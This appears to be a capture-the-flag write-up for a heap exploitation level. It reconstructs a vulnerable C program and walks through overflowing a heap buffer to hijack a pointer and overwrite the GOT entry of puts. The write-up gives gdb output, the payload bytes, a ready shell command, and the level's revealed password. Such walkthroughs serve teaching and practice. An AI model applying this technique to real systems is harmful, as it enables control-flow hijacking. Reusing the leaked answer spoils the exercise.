@@ -1,0 +1,116 @@
+# Level 7 — Heap Pointer Hijack to GOT Overwrite
+
+## Introduction
+This level demonstrates a advanced heap exploit technique: overwriting a structure's buffer pointer on the heap to perform an arbitrary write, which is then used to hijack the GOT entry of `puts`.
+
+## Analysis
+The reconstructed C code of the binary is:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+char c[80]; // Global buffer
+
+struct Node {
+    int id;
+    char *buf;
+};
+
+void m(void) {
+    time_t tVar1 = time(NULL);
+    printf("%s - %ld\n", c, tVar1); // Prints the flag
+}
+
+int main(int argc, char *argv[]) {
+    struct Node *node1;
+    struct Node *node2;
+    FILE *stream;
+
+    node1 = (struct Node *)malloc(sizeof(struct Node)); // 8 bytes
+    node1->id = 1;
+    node1->buf = (char *)malloc(8); // 8 bytes
+
+    node2 = (struct Node *)malloc(sizeof(struct Node)); // 8 bytes
+    node2->id = 2;
+    node2->buf = (char *)malloc(8); // 8 bytes
+
+    if (argc > 2) {
+        strcpy(node1->buf, argv[1]); // Unbounded strcpy
+        strcpy(node2->buf, argv[2]); // Unbounded strcpy
+    }
+
+    stream = fopen("/home/user/level8/.pass", "r");
+    if (stream != NULL) {
+        fgets(c, 0x44, stream); // Reads flag into global c
+        fclose(stream);
+    }
+
+    puts("~~"); // Executes puts
+    return 0;
+}
+```
+
+The program contains a function `m` that prints the flag stored in `c`, but `m` is never called. However, `puts` is called at the end of `main`. If we overwrite the GOT entry of `puts` with the address of `m`, we can redirect execution when `puts("~~")` is called.
+
+### Double strcpy Heap Exploit Strategy
+We have two sequential allocations:
+1. `node1` struct.
+2. `node1->buf` buffer.
+3. `node2` struct.
+4. `node2->buf` buffer.
+
+Since `node1->buf` is allocated before the `node2` struct, we can overflow `node1->buf` (via `argv[1]`) to overwrite the `node2` struct itself. Specifically, we will overwrite `node2->buf` (which is a pointer) with the GOT entry address of `puts`.
+
+When the second `strcpy(node2->buf, argv[2])` runs, it will copy `argv[2]` to the destination address stored in `node2->buf`. Since we hijacked `node2->buf` to point to the GOT entry of `puts`, `strcpy` will overwrite the GOT entry of `puts` with `argv[2]`. We set `argv[2]` to the address of `m`.
+
+### Finding the GOT Entry Address of `puts`
+We disassemble the PLT stub for `puts` inside `gdb`:
+```gdb
+(gdb) disassemble puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:	push   0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+```
+The jump targets `0x8049928`. This is the GOT entry address of `puts`.
+
+### Finding the Address of `m`
+We use `gdb` to find the address of the `m` function:
+```gdb
+(gdb) info functions m
+All functions matching regular expression "m":
+
+Non-debugging symbols:
+0x080484f4  m
+```
+The address of `m` is `0x080484f4`.
+
+### Offset Calculation
+We need to know the offset from `node1->buf` to `node2->buf` in `node2` struct:
+- `node1->buf` user data size: 8 bytes.
+- `node2` chunk metadata size: 8 bytes.
+- `node2->id` size: 4 bytes.
+Total padding = `8 + 8 + 4 = 20` bytes.
+
+Following the 20 bytes of padding, we write the target address of `puts`'s GOT entry (`0x08049928`).
+
+### Crafting the Arguments
+- **`argv[1]` (20 bytes padding + target address):**
+  `"A" * 20 + "\x28\x99\x04\x08"`
+- **`argv[2]` (address of `m`):**
+  `"\xf4\x84\x04\x08"`
+
+## Exploit
+Run the binary passing the two payloads:
+```bash
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+This overwrites `puts`'s GOT entry with `m`'s address. When `puts` is called, it branches to `m` and prints the flag for `level8`:
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+We save this password to proceed to `level8`.
